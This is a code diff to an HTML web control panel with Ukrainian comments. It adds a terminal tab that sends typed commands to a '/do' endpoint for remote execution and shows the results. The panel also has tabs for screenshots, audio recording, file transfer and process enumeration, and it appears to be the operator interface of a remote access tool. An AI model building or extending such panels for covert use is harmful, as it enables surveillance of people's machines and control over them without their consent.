@@ -127,6 +127,53 @@
         .info-title {
             font-weight: bold;
         }
+        .terminal {
+            background-color: #0f0f0ff3;
+            color: #00ff00;
+            font-family: monospace;
+            padding: 20px;
+            border-radius: 8px;
+            height: 500px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+        }
+
+        .terminal-output {
+            flex: 1;
+            overflow-y: auto;
+            margin-bottom: 10px;
+            white-space: pre-wrap;
+        }
+
+        .terminal-input {
+            display: flex;
+            align-items: center;
+        }
+
+        .prompt {
+            color: #00ff00;
+            margin-right: 5px;
+        }
+
+        .terminal input[type="text"] {
+            background-color: transparent;
+            color: #00ff00;
+            border: none;
+            outline: none;
+            font-family: monospace;
+            width: 100%;
+        }
+
+        .terminal input[type="text"]::placeholder {
+            color: #00ff00;
+            opacity: 0.5;
+        }
+
+        .terminal input[type="text"]:focus {
+            outline: none;
+        }
     </style>
 </head>
 <body>
@@ -145,7 +192,7 @@
             <button onclick="openTab('transfer', this)">Transfer file</button>
             <button onclick="openTab('screenshot', this)">Make Screenshot</button>
             <button onclick="openTab('audio', this)">Record Audio</button>
-            <button onclick="openTab('start', this)">Start</button>
+            <button onclick="openTab('cmd', this)">Command line</button>
             <button onclick="openTab('stop', this)">Stop</button>
             <button onclick="openTab('info', this)">System Info</button>
             <button onclick="openTab('process', this)">Process Enumeration</button>
@@ -176,10 +223,16 @@
                 <h2>Record Audio</h2>
                 <p>This tab is for recording audio.</p>
             </div>
-            <div id="start" class="tab-content">
-                <h2>Start</h2>
-                <p>This tab is for starting processes.</p>
+            <div id="cmd" class="tab-content">
+                <div class="terminal">
+                    <div class="terminal-output" id="terminal-output"></div>
+                    <div class="terminal-input">
+                        <span class="prompt">$</span>
+                        <input type="text" id="command-input" placeholder="Enter command" />
+                    </div>
+                </div>
             </div>
+            
             <div id="stop" class="tab-content">
                 <h2>Stop</h2>
                 <p>This tab is for stopping processes.</p>
@@ -253,13 +306,10 @@
                     { title: 'Username', value: data.username, icon: '👤' },
                     { title: 'Processor', value: data.processor, icon: '🧠' },
                     { title: 'System Architecture', value: data.architecture, icon: '🔧' },
-
                     { title: 'Graphics Processor', value: data.gpu, icon: '🎮' },
                     { title: 'RAM Size', value: data.ram, icon: '🧮' },
                     { title: 'Disk Size / Free Space', value: `${data.diskSize} / ${data.freeSpace}`, icon: '💾' },
                     { title: 'Screen Size', value: data.screenSize, icon: '📺' },
-
-
                     { title: 'Device Type', value: data.deviceType, icon: '📱' },
                     { title: 'Hostname', value: data.hostname, icon: '🏷️' },
                     { title: 'Local IP Address', value: data.localIp, icon: '🌐' },
@@ -313,6 +363,79 @@
         window.onload = function() {
             openTab('sysinfo', document.getElementById('sysinfoButton'));
         };
+        const commandHistory = []; // Масив для зберігання історії команд
+        let historyIndex = -1; // Індекс для відстеження поточної команди в історії
+
+        document.getElementById('command-input').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                const _command = e.target.value;
+                const output = document.getElementById('terminal-output');
+
+                // Запам'ятовуємо команду в історії
+                if (_command.trim() !== '' && commandHistory.at(-1) !== _command.trim()) {
+                    commandHistory.push(_command);
+                    historyIndex = commandHistory.length; // Скидаємо індекс
+                }
+
+                // Відображення команди у вихідному вікні
+                const commandLine = document.createElement('div');
+                commandLine.textContent = `$ ${_command}`;
+                output.appendChild(commandLine);
+
+                // Очищення введення
+                e.target.value = '';
+
+                // Перевірка на команду clear
+                if (_command.trim() === 'clear') {
+                    // Очищення області виходу терміналу
+                    output.innerHTML = '';
+                } else if(_command.trim() === '') {
+                    
+                } else {
+                    fetch('/do', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ action: 'exec_com', command: _command })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        const responseLine = document.createElement('div');
+                        responseLine.textContent = data.output;
+                        output.appendChild(responseLine);                
+                    });
+                }
+
+                // Прокрутка до низу
+                setTimeout(() => {
+                    output.scrollTop = output.scrollHeight;
+                }, 100);
+            }
+        });
+
+        // Обробка натискань клавіш для стрілок
+        document.getElementById('command-input').addEventListener('keydown', function(e) {
+            if (e.key === 'ArrowUp') {
+                // Якщо індекс більше 0, переміщаємося вгору в історії
+                if (historyIndex > 0) {
+                    historyIndex--;
+                    e.target.value = commandHistory[historyIndex];
+                }
+                e.preventDefault(); // Зупиняємо стандартну поведінку
+            } else if (e.key === 'ArrowDown') {
+                // Якщо індекс менший за довжину історії, переміщаємося вниз
+                if (historyIndex < commandHistory.length - 1) {
+                    historyIndex++;
+                    e.target.value = commandHistory[historyIndex];
+                } else {
+                    historyIndex = commandHistory.length; // Скидаємо індекс, щоб очистити введення
+                    e.target.value = '';
+                }
+                e.preventDefault(); // Зупиняємо стандартну поведінку
+            }
+        });
+
     </script>
 </body>
 </html>
